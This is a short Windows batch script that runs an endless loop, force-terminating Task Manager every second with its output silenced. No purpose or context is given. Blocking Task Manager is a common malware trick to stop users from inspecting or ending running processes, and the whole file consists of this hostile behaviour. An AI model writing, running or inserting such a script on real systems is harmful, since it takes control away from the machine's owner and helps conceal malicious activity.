@echo off
:loop
taskkill /f /im Taskmgr.exe >nul 2>&1
timeout /t 1 >nul
goto loop